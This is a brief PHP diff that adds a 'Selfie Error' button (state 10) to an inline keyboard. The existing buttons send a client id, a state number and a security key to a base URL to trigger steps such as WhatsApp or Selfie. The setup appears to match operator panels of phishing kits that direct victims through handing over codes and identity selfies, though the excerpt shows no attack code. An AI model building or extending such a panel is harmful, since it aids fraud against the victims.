@@ -73,7 +73,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             ],
             [
                 ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$cliente_id&estado=8&key=$security_key"],
-                ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"]
+                ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"],
+                ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$cliente_id&estado=10&key=$security_key"]
             ]
         ]
     ];
